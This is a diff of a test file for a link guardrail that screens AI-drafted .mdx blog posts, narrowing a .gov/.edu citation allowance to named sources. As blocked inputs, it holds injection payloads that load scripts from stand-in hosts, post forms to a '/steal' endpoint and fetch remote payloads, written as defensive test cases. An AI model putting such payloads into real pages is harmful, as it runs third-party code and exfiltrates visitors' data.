@@ -2723,15 +2723,22 @@ describe('third-party price citations + citation-grade TLDs (owner ruling 2026-0
     expect(findHardcodedPrice('The industry average is $145 per quarterly visit.', OP)).toBeNull();
   });
 
-  test('operator drafts may cite any .gov / .edu (statutes, extension research)', () => {
-    for (const body of [
-      'Florida law sets the cancellation window — see [the statute](https://www.flsenate.gov/Laws/Statutes/2024/501.017).',
-      'UF/IFAS covers chinch bug thresholds in [this guide](https://edis.ifas.ufl.edu/publication/IN1234).',
-      'The state extension service explains it at https://extension.msstate.edu/publications/insects.',
-    ]) {
-      const r = guardrails.evaluate({ body }, { operatorCitations: true });
-      expect(r.findings.some((f) => f.code === 'DISALLOWED_EXTERNAL_LINK')).toBe(false);
-    }
+  test('operator citations are the BRIEF\'S NAMED SOURCES, not a TLD class', () => {
+    // The broad .gov/.edu allowance is gone (owner ruling 2026-08-01): a
+    // host-wide rule had to be defended at every position a URL can appear,
+    // and each one was a bypass into executable .mdx. A named source is
+    // allowed WHEREVER it appears; an unnamed host never is.
+    const named = { operatorCitations: true, requiredSourceUrls: ['https://research.example.edu/paper'] };
+    const none = { operatorCitations: true, requiredSourceUrls: [] };
+    expect(guardrails._internals.externalLinkFinding('Per https://research.example.edu/paper, chinch bugs peak.', named)).toBeNull();
+    expect(guardrails._internals.externalLinkFinding('![x](https://research.example.edu/p.svg)', { operatorCitations: true, requiredSourceUrls: ['https://research.example.edu/p.svg'] })).toBeNull();
+    // Unnamed hosts block regardless of TLD or position.
+    expect(guardrails._internals.externalLinkFinding('Per https://research.example.edu/paper, chinch bugs peak.', none)?.code).toBe('DISALLOWED_EXTERNAL_LINK');
+    expect(guardrails._internals.externalLinkFinding('<script src="https://student.example.edu/p.js"></script>', none)?.code).toBe('DISALLOWED_EXTERNAL_LINK');
+    // The CURATED host list still stands on its own.
+    expect(guardrails._internals.externalLinkFinding('See https://www.epa.gov/pesticides for details.', none)).toBeNull();
+    // Mined drafts get nothing.
+    expect(guardrails._internals.externalLinkFinding('Per https://research.example.edu/paper.', {})?.code).toBe('DISALLOWED_EXTERNAL_LINK');
   });
 
   test('citation-grade TLDs do NOT leak to mined drafts (injection boundary holds)', () => {
@@ -2742,36 +2749,6 @@ describe('third-party price citations + citation-grade TLDs (owner ruling 2026-0
     expect(r.findings.some((f) => f.code === 'DISALLOWED_EXTERNAL_LINK' && f.severity === 'P0')).toBe(true);
   });
 
-  test('citation-grade TLDs are for PASSIVE links only (r11)', () => {
-    // Posts publish as executable .mdx, so a delegated .edu subdomain in an
-    // active resource position would become live third-party code.
-    const OPC = { operatorCitations: true, requiredSourceUrls: [] };
-    for (const body of [
-      '<script src="https://student.example.edu/payload.js"></script>',
-      '<iframe src="https://student.example.edu/x"></iframe>',
-      // Enumerating active positions missed these; the rule is an allowlist.
-      '<script is:inline>fetch("https://student.example.edu/payload.js")</script>',
-      '<form action="https://student.example.edu/steal"></form>',
-      '<a ping="https://student.example.edu/track">x</a>',
-      '{fetch("https://student.example.edu/payload.js")}',
-      '<Comp src={"https://student.example.edu/x"} />',
-      // Markdown images render as remote <img> resources.
-      '![x](https://student.example.edu/payload.svg)',
-      '![x][p]\n\n[p]: https://student.example.edu/payload.svg',
-      '![p][]\n\n[p]: https://student.example.edu/payload.svg',
-      '![p]\n\n[p]: https://student.example.edu/payload.svg',
-    ]) {
-      expect(guardrails._internals.externalLinkFinding(body, OPC)?.code).toBe('DISALLOWED_EXTERNAL_LINK');
-    }
-    // Passive citations are unaffected.
-    expect(guardrails._internals.externalLinkFinding('Per [the study](https://research.example.edu/paper), chinch bugs peak in July.', OPC)).toBeNull();
-    expect(guardrails._internals.externalLinkFinding('See https://www.epa.gov/pesticides for details.', OPC)).toBeNull();
-    expect(guardrails._internals.externalLinkFinding('See the study.\n\n[1]: https://research.example.edu/paper', OPC)).toBeNull();
-    // Reference-style LINKS stay citations (only image refs are active).
-    expect(guardrails._internals.externalLinkFinding('See [the study][1].\n\n[1]: https://research.example.edu/paper', OPC)).toBeNull();
-    // A Markdown AUTOLINK is a citation, not a tag named "https".
-    expect(guardrails._internals.externalLinkFinding('See <https://research.example.edu/paper> for the study.', OPC)).toBeNull();
-  });
 
   test('only the exact .gov/.edu suffix qualifies — lookalikes still block', () => {
     for (const body of [
